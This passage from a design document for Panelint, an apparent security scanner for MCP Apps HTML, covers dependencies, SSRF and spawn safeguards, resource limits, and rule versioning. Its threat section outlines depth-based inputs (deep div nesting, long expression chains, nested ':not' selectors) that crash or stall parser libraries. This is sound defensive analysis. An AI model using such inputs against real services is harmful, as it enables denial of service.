└── test/            corpus.test.ts · malicious.test.ts · registry-docs.test.ts · never-fire.test.ts
```

## 9. Dependencies

| Package | Why | Note |
|---|---|---|
| `parse5` | Spec-compliant HTML5 parsing, no execution | jsdom rejected — heavier, executes scripts |
| `parse5-htmlparser2-tree-adapter` | **[v2]** domhandler tree; keeps `sourceCodeLocation` **and** adds `startIndex`/`endIndex` | |
| `css-select` | **[v2]** selector matching against that tree | `css-select-parse5-adapter` rejected — unmaintained since 2022, still `1.0.0-pre.1` |
| `domutils` | **[v2]** `textContent`, ancestor walks, traversal | |
| `postcss` | CSS declaration parsing | regex rejected — wrong for nested at-rules |
| `postcss-selector-parser` | **[v2]** classify selectors; skip pseudo-elements, mark stateful pseudo-classes non-applying | |
| `@csstools/selector-specificity` | **[v2]** cascade conflict resolution | |
| `culori` | **[v2]** colour parsing + WCAG contrast for `PANE-HIDDEN-004` | |
| `acorn` | **[v2]** JS AST — required by `PANE-CONTEXT`, `PANE-DOM`, `PANE-MSG`, `PANE-EXFIL-002/004` | see below |
| `ajv` — **`Ajv2020` from `ajv/dist/2020`** | JSON Schema draft 2020-12 with strict `additionalProperties` | the default export **cannot compile the schema** |
| `csp_evaluator` (Google) | JSONP/Angular bypass allowlists, HTTP/IP source checks | **curated check list only** — see §3.3 |
| `tldts` | **[v2]** Public Suffix List for `PANE-CSP-005` | replaces a hand-maintained list |
| `@modelcontextprotocol/sdk` | Live server connection | hand-rolled JSON-RPC rejected |
| `commander` | CLI | — |

All direct dependencies are **exact-pinned**, `package-lock.json` is committed, CI runs `npm ci`
with `--ignore-scripts` where possible, and npm provenance is enabled for Panelint's own publishes.
Any lockfile diff whose `resolved` URL is off-registry requires a review note. A scanner that ships
a compromised release is worse than no scanner — and [THREAT-MODEL.md](THREAT-MODEL.md) cites
`eslint-config-prettier` as attacker A4's precedent, so this is our own threat model applied to us.

> ### Correction [v3] — the dependency count was understated by an order of magnitude
> [THREAT-MODEL.md](THREAT-MODEL.md) §5 said *"Panelint has 14 dependencies."* Measured against the
> committed lockfile rather than counted off the table above: **16 direct dependencies, and a
> production install closure of 119 packages.**
>
> **93 of those 119 come from `@modelcontextprotocol/sdk@1.30.0` alone**, 88 of them attributable to
> nothing else. The five shared with the rest of the tree are `ajv` and its dependencies. What the
> SDK pulls in, measured:
>
> ```
> express@5.2.1   hono@4.13.0   @hono/node-server@2.1.0   cors@2.8.6   body-parser@2.3.0
> serve-static@2.2.1   express-rate-limit@8.6.2   jose@6.2.8   pkce-challenge@5.0.1
> eventsource@3.0.7   cross-spawn@7.0.6   zod@4.4.3
> ```
>
> Panelint uses the SDK as a **stdio client only**. It ships two HTTP server frameworks, a static file
> server, and a full OAuth stack to a CLI that opens no socket and serves no request. Stating that
> plainly matters more than the number: this is a supply-chain threat model that undercounted its own
> supply chain by 8×, in the same section that names `eslint-config-prettier`.
>
> Three options, none yet taken:
>
> 1. **Deep-import only the stdio client** (`sdk/client/index.js` + `sdk/client/stdio.js`). This
>    shrinks the module graph that actually executes, which is the code that can run at scan time.
>    **It does not shrink the install.** npm still fetches all 93 packages and they stay in the
>    lockfile, so the exposure a lockfile-poisoning attacker cares about is unchanged. Do not record
>    this as a fix for the number.
> 2. **Hand-roll the JSON-RPC stdio client.** The surface Panelint uses is four methods over
>    newline-delimited JSON-RPC on a pipe: `initialize`, `resources/list`, `tools/list`,
>    `resources/read`. This table rejected it as "hand-rolled JSON-RPC rejected", on a cost judgement
>    made **before** anyone measured 93. The judgement is not necessarily wrong now, but it was
>    reached without the input that matters most.
> 3. **Accept it and disclose it.** Then the number in THREAT-MODEL.md §5 has to be the real one, and
>    `npm ci --ignore-scripts` plus a lockfile review stop being hygiene and start being the whole
>    control.
>
> Until one is chosen, option 3 is what is in force, because it is what shipping without a decision
> means. The figures above are reproducible from `package-lock.json`; a test should derive them so
> this correction cannot go stale the way the last count did.

> **`PANE-CONTEXT` is not a free string match [v2] — confirmed in the wild.** MCP Apps resources are
> raw HTML with no build step, so apps **inline the ext-apps SDK bundle**, which contains the literal
> strings `ui/message`, `ui/update-model-context` and `ui/download-file` whether or not the app ever
> calls them. A naive `content.includes("ui/message")` fires on every SDK-bundling app.
>
> Verified in two independent third-party servers during the 2026-08-05 hand-scan (origins redacted
> per CLAUDE.md §1.2): each embeds the full minified schema, including every method literal and the
> complete `McpUiResourceCsp` description. Reproduced synthetically in
> `fixtures/nondetect/sdk-bundle-inlined.html`.
>
> Detection must therefore be **call-site based** on the SDK surface (`app.sendMessage(`,
> `app.updateModelContext(`, `app.openLink(`, the deprecated `sendOpenLink`) or on raw JSON-RPC
> `method:` property values in an AST. Hence `acorn` — **a hard requirement, not a refinement.**

Deliberately absent: no telemetry, no network calls outside explicit live-scan targets, no LLM
dependency in v1.

## 10. Threats to Panelint itself

**This section did not exist in v1.** Panelint parses hostile input by design, over a live
connection, as a security tool. [THREAT-MODEL.md](THREAT-MODEL.md) §4 dismissed resource exhaustion
as "the spec defers it to hosts" — that reasoning is about the *host*, and was silently applied to
the scanner too.

**Code execution.** stdio acquisition **spawns the target server process**. Scanning a hostile repo
runs its code, potentially in CI with credentials in the environment. Gated behind an explicit
`--allow-spawn`, with the resolved command echoed before it runs. Spawn timeout, stdin/stdout byte
caps, and guaranteed child kill on exit including SIGINT.

**Protocol-version reachability [v3].** Before any control below matters, the connection has to
succeed at all — and, measured against `@modelcontextprotocol/sdk@1.30.0`, it does not against a
server speaking the `2026-01-26` Stable protocol version. See §3.1 for the measurement and the two
unscheduled ways out.

**SSRF.** `--server <url>` fetches user-supplied URLs. Non-public IP ranges (including
`169.254.169.254`) and non-`http(s)` schemes are rejected; cross-host redirects are refused, not
followed.

**Resource exhaustion.** Every limit lives in `src/limits.ts`, is overridable by flag, and produces
a `LIMIT_EXCEEDED` diagnostic rather than a crash or a silent pass:

| Limit | Default | Why |
|---|---|---|
| `--max-resource-bytes` | 8 MB | `resources/read` is uncapped by the SDK |
| max DOM nodes | 100 k | recursive walkers blow the stack |
| max CSS rules | 20 k | selector matching is O(rules × nodes) — 50 k × 20 k is 10⁹ `is()` calls, inside the "sub-second" claim |
| selector-match budget | — | hard ceiling independent of the two above |
| per-resource wall clock | 5 s | **[v3] Unenforceable as specified — see below** |
| max total resources | 500 | |
| max nesting depth | — | deeply nested HTML overflows recursive rules. **[v3] enforceable only pre-parse** |
| base64 decode cap | — | `PANE-HIDDEN-010` must not decode an 80 MB data URI |

`fixtures/malicious/` carries a case for each.

#### Four DoS paths that table does not catch — all four measured **[v3]**

Run against the pinned dependency versions, not reasoned about. Every one of them passes every limit
above and still takes the process down or blows the latency budget.

| Input | Measured result | The limit that was supposed to catch it |
|---|---|---|
| `<div>` nested N deep, through `parse5` | 25 KB → 67 ms · 100 KB → 982 ms · **200 KB → 3.9 s**. Cost is **O(depth²), not O(bytes)** | None. The 8 MB byte cap passes with three orders of magnitude to spare, the 100 k node cap passes, and `maxNestingDepth` **cannot be enforced before parse5 has already built the tree** |
| `acorn-walk` over `a+a+a…` × 5000 | `RangeError: Maximum call stack size exceeded`. **acorn itself parses it fine** | None. The crash is in the walker, downstream of every parse-side limit |
| `domutils.textContent` on a 60 k-deep tree | `RangeError` | None |
| `css-select` compiling `:not(:not(:not(…)))` × 5000 | `RangeError` at compile time | "max CSS rules 20 000". **This is one rule.** A per-rule limit does not bound per-selector cost |

The shape of all four is the same: the caps are on **volume**, and the attacks are on **depth**. A
depth attack is small, so it arrives well inside every byte and count budget the design already has.

Three controls, and the third is a rule about our own code rather than a number in a config file:

- **A pre-parse depth estimate on the raw bytes.** Counting unclosed tag opens over the byte stream
  is the *only* place a nesting-depth limit can fire, because after `parse5` returns, the cost has
  already been paid. Same for the JS: a cheap nesting-depth pass before `acorn-walk` runs. Both are
  approximations, both reject rather than truncate, and both emit `LIMIT_EXCEEDED`.
- **`RangeError` containment around every third-party call that recurses** — `parse5.parse`,
  `acorn-walk.simple`/`full`, `domutils.textContent`, `css-select` compile and match, `postcss`
  parse. A stack overflow inside a dependency becomes a per-resource diagnostic, never an exit-code-2
  crash of the whole scan and never a silent zero-findings pass.
- **Panelint's own traversals are iterative, with an explicit stack. No recursive helpers.** One
  convenience recursion added later reintroduces every crash above, in code we own, where no
  dependency boundary exists to catch it. This is a review rule in
  [CONTRIBUTING.md](../CONTRIBUTING.md), not a preference.

#### The 5 s per-resource wall clock cannot fire, and the 3.9 s parse proves it **[v3]**

§3 rejects `worker_threads` and states that rules are synchronous pure functions in a
single-threaded runtime. A synchronous `parse5`, `acorn`, `postcss` or `css-select` call **cannot be
interrupted by a timer on the same thread**: the timer callback is queued behind the very work it is
meant to abort. The 200 KB nesting input above blows through a 5 s ceiling that has no mechanism to
fire, and it would do the same at 50 s.

**Decision: the ceiling is on work, not on time.** Two mechanisms, both of which can actually run.

- **Cooperative deadline checks inside the loops Panelint owns** — the node walk, the selector-match
  loop, the per-rule dispatch. Each checks a monotonic deadline every N iterations and aborts with
  `LIMIT_EXCEEDED`.
- **Input-size pre-checks for the library calls it does not own.** Bytes, estimated depth, node
  count, selector count, and selector complexity are checked *before* the call, because there is no
  during.

The wall clock stays in the table as a **reporting** value and a scan-level guard, not as a
per-resource guarantee. Any output that implies a hard per-resource time bound is wrong.

The alternative that would restore a real timeout is to run one resource inside a `worker_threads`
worker, passing the resource **string** in and the **finding array** out. §3's v2 objection —
"a `domhandler` tree is not cloneable" — does not apply, because on that boundary the tree never
crosses: it is built inside the worker and dies there. Both sides are plain JSON. This is a real
option and it is **not scheduled**; recorded here so the v2 objection is not cited against it again.

**Output as an injection vector.** SARIF snippets and the public directory render attacker-authored
HTML. All evidence strings are HTML-escaped and length-capped in every output format, and the
directory renders evidence as text, never as markup.

**Log hygiene.** Never log resource content, decoded blobs, `_meta` values, the environment passed
to a spawned server, or any URL from `connectDomains`. Findings quote a truncated excerpt at most —
if someone pipes Panelint output into a CI log, a hidden-text finding must not reproduce the
injection payload in full.

## 11. Rule-ID versioning

SARIF `rules[].id` is a public contract: the census directory keys on it and disclosure emails cite
it.

- IDs are **permanent and never reused**. A retired rule keeps its ID with `status: retired`.
- Severity or class changes are **minor-version events**, recorded in a changelog section of
  [RULES.md](RULES.md).
- `panelint rules --json` is the machine-readable source of truth, and `test/registry-docs.test.ts`
  asserts it matches the tables in RULES.md.

## 12. Open questions

1. ~~**Is `_meta.ui.domain` populated in practice?**~~ **Answered, provisionally: no.** Measured
   against eight reference servers, **none** declares `_meta.ui.domain` or `prefersBorder`, and only
   two declare `_meta.ui.csp` at all. `PANE-SANDBOX-001`'s same-origin test therefore has no
   declared origin to compare against in the common case and can only fire on relative or `srcdoc`
   frames — its `HIGH` confidence needs re-examination once the Phase 3 census gives a population
   figure rather than a corpus of eight.
2. **`PANE-CONTEXT-005` taint analysis.** Source and sinks are now identified
   ([SPEC-REFERENCE.md](SPEC-REFERENCE.md) §4), but Semgrep-style sources → sinks over an AST is
   real work. **Correction [v3]: the rule ships in v1**, registered at `MEDIUM` confidence per
   [RULES.md § Rule-count summary](RULES.md#rule-count-summary) — the open question is the *quality*
   of the taint pass, which is real work and may warrant Semgrep as the engine, not *whether* the
   rule exists in the registry.
3. **Registry-wide scanning.** `registry.modelcontextprotocol.io` exposes no capability field, so
   servers declaring Apps support cannot be enumerated from the manifest — capability negotiation
   happens at runtime `initialize`. The census must be built from GitHub code search, and that
   process should be scripted and published. Note the census should **union two queries**: the MIME
   literal `text/html;profile=mcp-app` **and** `registerAppResource` — SDK-using servers may never
   write the MIME literal, so the 275 figure is a floor along an axis the market research does not state.
4. **Rendered-DOM mode stays deferred. Geometric visibility is refused outright.** v1 answered these
   as one question and they are two. A headless render would close the base64-decoded-post-load
   payload, and it breaks constraints 1 and 2 — deferred, as before. But *geometric* hiding
   (occlusion by an opaque sibling, text clipped by an ancestor's `overflow`) is refused
   permanently, and not on cost grounds: deciding it needs line boxes, font metrics and image
   decoding, and the **host** supplies the fonts and the viewport. Panelint would be verifying host
   behaviour, which non-goal **N2** forbids. Both patterns are also ubiquitous and legitimate —
   truncated table cells, scroll panes, tab stacks — so a rule here carries a false-positive
   *guarantee*, not a false-positive risk. `fixtures/nondetect/` asserts **zero** findings on each,
   so the refusal is regression-locked against a future contributor improving the tool into a
   browser.
5. **A browser belongs in `devDependencies`, never in the shipped tree.** The resolver's worst risk
   is disagreeing with a real engine (§3.2). The cheap answer is a CI job that renders every
   `test/` and `fixtures/` case in Playwright and diffs `getComputedStyle` against the resolver,
   failing on disagreement. The browser only ever sees fixtures this project wrote, so runtime
   exposure stays zero and "enforced by test, not by intent" (§1) keeps holding as CSS evolves.
   Not yet scheduled.
6. **Should `RISK` be gate-eligible by default at all?** `--fail-on high` plus `RISK`/`HIGH` rules
   like `PANE-CSP-001` means a wildcard `connectDomains` breaks the build. Defensible and probably
   right, but it is a product decision with adoption consequences and it should be stated
   explicitly rather than emerging from the formula.
